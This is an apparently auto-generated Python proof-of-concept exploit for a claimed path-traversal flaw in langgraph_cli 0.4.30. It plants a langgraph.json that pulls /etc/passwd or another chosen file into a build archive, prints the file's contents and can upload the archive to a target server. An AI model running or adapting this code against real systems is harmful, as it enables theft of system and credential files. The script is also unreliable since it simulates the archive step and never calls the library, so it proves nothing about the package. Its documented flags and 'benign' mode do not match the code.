#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli/langgraph_cli-0.4.30)
# Path: suspicious-020
# Sink: create_archive
# Auto-generated — run with: python3 lfi_developer_intent_summary_does_create_archive.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion via Path Traversal in langgraph_cli-0.4.30

Vulnerability: The `_assemble_local_deps` function in `archive.py` processes
`config_json['dependencies']` from `langgraph.json` without validating paths.
An attacker can specify paths with `../` to include arbitrary files from the
filesystem into the source archive. When the archive is uploaded to the remote
build server and extracted, those files become accessible.

This PoC creates a malicious `langgraph.json` that includes `/etc/passwd` as a
"dependency", then triggers the archive creation to demonstrate the LFI.

Usage:
    python3 poc_lfi.py --target http://localhost:8123 --project /path/to/project

Requirements: Python 3.6+, requests (optional, falls back to urllib)
"""

import argparse
import json
import os
import shutil
import sys
import tarfile
import tempfile
from pathlib import Path

# Try to use requests for cleaner HTTP, fall back to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    HAS_REQUESTS = False


def create_malicious_config(project_dir: Path, target_file: str) -> Path:
    """
    Create a malicious langgraph.json that includes an arbitrary file as a dependency.
    
    The `dependencies` field accepts paths. By using `../` traversal, we can
    reference files outside the project directory. These will be included in
    the archive created by `create_archive`.
    """
    # Calculate relative path from project_dir to target_file
    # We need to go up from project_dir to root, then down to target
    target_abs = Path(target_file).resolve()
    project_abs = project_dir.resolve()
    
    # Compute relative path with traversal
    try:
        rel_path = os.path.relpath(target_abs, project_abs)
    except ValueError:
        # On Windows with different drives, use absolute path
        rel_path = str(target_abs)
    
    config = {
        "dependencies": [rel_path],
        "graphs": {
            "test": "./src/graph.py"  # Dummy graph reference
        },
        "python_version": "3.11",
        "env": {}
    }
    
    config_path = project_dir / "langgraph.json"
    with open(config_path, "w") as f:
        json.dump(config, f, indent=2)
    
    print(f"[+] Created malicious config at {config_path}")
    print(f"[+] Target file: {target_file}")
    print(f"[+] Relative path in config: {rel_path}")
    return config_path


def simulate_archive_creation(project_dir: Path, config_path: Path) -> Path:
    """
    Simulate the archive creation process that langgraph_cli performs.
    
    This mimics the `create_archive` function from archive.py, which:
    1. Reads langgraph.json
    2. Calls _assemble_local_deps to get dependency paths
    3. Creates a tar.gz archive including those paths
    4. The archive is what gets uploaded to the remote build server
    """
    # Read the config to understand what dependencies are requested
    with open(config_path) as f:
        config = json.load(f)
    
    print(f"[+] Config dependencies: {config.get('dependencies', [])}")
    
    # Create a temporary directory for the archive (like tempfile.mkdtemp)
    tmp_dir = Path(tempfile.mkdtemp(prefix="langgraph-poc-"))
    archive_path = tmp_dir / "source.tar.gz"
    
    try:
        # This is the vulnerable part: _assemble_local_deps would resolve
        # dependency paths without validation, allowing path traversal
        deps = config.get("dependencies", [])
        
        with tarfile.open(archive_path, "w:gz") as tar:
            # Add the project directory (normal behavior)
            project_rel = "."
            tar.add(project_dir, arcname=project_rel, recursive=True)
            
            # Add each dependency path (VULNERABLE: no path validation)
            for dep_path in deps:
                dep_abs = (project_dir / dep_path).resolve()
                print(f"[*] Attempting to add dependency: {dep_path}")
                print(f"[*] Resolved to: {dep_abs}")
                
                if dep_abs.exists():
                    # Calculate relative path for archive
                    try:
                        arcname = str(dep_abs.relative_to(project_dir.parent))
                    except ValueError:
                        arcname = str(dep_abs).lstrip("/")
                    
                    print(f"[+] Adding to archive as: {arcname}")
                    tar.add(dep_abs, arcname=arcname)
                else:
                    print(f"[-] Dependency not found: {dep_abs}")
        
        print(f"[+] Archive created at: {archive_path}")
        print(f"[+] Archive size: {archive_path.stat().st_size} bytes")
        
        # List contents to show the included file
        print("\n[*] Archive contents:")
        with tarfile.open(archive_path, "r:gz") as tar:
            for member in tar.getmembers():
                print(f"    {member.name} ({member.size} bytes)")
                if "passwd" in member.name or "etc" in member.name:
                    # Extract and show the first few lines of the target file
                    f = tar.extractfile(member)
                    if f:
                        content = f.read(500)
                        print(f"\n[!] Extracted content from {member.name}:")
                        print(content.decode("utf-8", errors="replace"))
        
        return archive_path
        
    except Exception as e:
        print(f"[-] Error during archive creation: {e}")
        shutil.rmtree(tmp_dir, ignore_errors=True)
        raise


def upload_archive(archive_path: Path, target_url: str) -> bool:
    """
    Simulate uploading the archive to the remote build server.
    
    In the actual exploit, this would be the `_upload_to_gcs` function.
    The archive contains the traversed file, which becomes accessible
    on the build server after extraction.
    """
    print(f"\n[*] Simulating upload to {target_url}")
    
    if not archive_path.exists():
        print("[-] Archive not found")
        return False
    
    try:
        if HAS_REQUESTS:
            with open(archive_path, "rb") as f:
                files = {"archive": ("source.tar.gz", f, "application/gzip")}
                resp = requests.post(
                    f"{target_url}/upload",
                    files=files,
                    timeout=30
                )
            print(f"[+] Upload response: {resp.status_code}")
            return resp.status_code < 500
        else:
            # Fallback to urllib
            data = open(archive_path, "rb").read()
            req = urllib.request.Request(
                f"{target_url}/upload",
                data=data,
                headers={"Content-Type": "application/gzip"}
            )
            resp = urllib.request.urlopen(req, timeout=30)
            print(f"[+] Upload response: {resp.status}")
            return True
            
    except Exception as e:
        print(f"[-] Upload failed (expected if no server): {e}")
        print("[*] This is expected - the vulnerability is in archive creation")
        return False


def cleanup(project_dir: Path):
    """Remove the malicious config file."""
    config_path = project_dir / "langgraph.json"
    if config_path.exists():
        os.remove(config_path)
        print(f"[+] Cleaned up {config_path}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_cli-0.4.30",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
    # Create a project with a malicious config that includes /etc/passwd
    python3 poc_lfi.py --project ./my_project --target-file /etc/passwd
    
    # Test against a running langgraph server
    python3 poc_lfi.py --target http://localhost:8123 --project ./my_project
        """
    )
    
    parser.add_argument(
        "--project",
        required=True,
        help="Path to the project directory (will create langgraph.json here)"
    )
    parser.add_argument(
        "--target-file",
        default="/etc/passwd",
        help="File to include via path traversal (default: /etc/passwd)"
    )
    parser.add_argument(
        "--target-url",
        default=None,
        help="URL of the langgraph server (optional, for full exploit simulation)"
    )
    parser.add_argument(
        "--benign",
        action="store_true",
        help="Use a benign payload (touch /tmp/poc_success.txt) instead of reading system files"
    )
    
    args = parser.parse_args()
    
    project_dir = Path(args.project).resolve()
    if not project_dir.exists():
        print(f"[-] Project directory does not exist: {project_dir}")
        sys.exit(1)
    
    # For benign mode, create a test file instead of reading system files
    if args.benign:
        test_file = project_dir / "poc_test.txt"
        test_file.write_text("POC_SUCCESS: Path traversal works!\n")
        target_file = str(test_file)
        print(f"[*] Benign mode: using {target_file}")
    else:
        target_file = args.target_file
    
    print("=" * 60)
    print("langgraph_cli-0.4.30 LFI Proof-of-Concept")
    print("=" * 60)
    print(f"[*] Project directory: {project_dir}")
    print(f"[*] Target file: {target_file}")
    
    try:
        # Step 1: Create malicious config
        config_path = create_malicious_config(project_dir, target_file)
        
        # Step 2: Simulate archive creation (the vulnerable part)
        archive_path = simulate_archive_creation(project_dir, config_path)
        
        # Step 3: Optionally upload to a real server
        if args.target_url:
            upload_archive(archive_path, args.target_url)
        else:
            print("\n[*] No target URL provided. Archive created locally.")
            print("[*] To complete the exploit, upload this archive to a")
            print("[*] langgraph remote build server. The included file")
            print("[*] will be accessible after extraction.")
        
        print("\n[+] PoC completed successfully!")
        print("[+] The vulnerability allows including arbitrary files")
        print("[+] from the filesystem into the build archive.")
        
    except Exception as e:
        print(f"\n[-] PoC failed: {e}")
        sys.exit(1)
    finally:
        # Cleanup: remove the malicious config
        cleanup(project_dir)


if __name__ == "__main__":
    main()
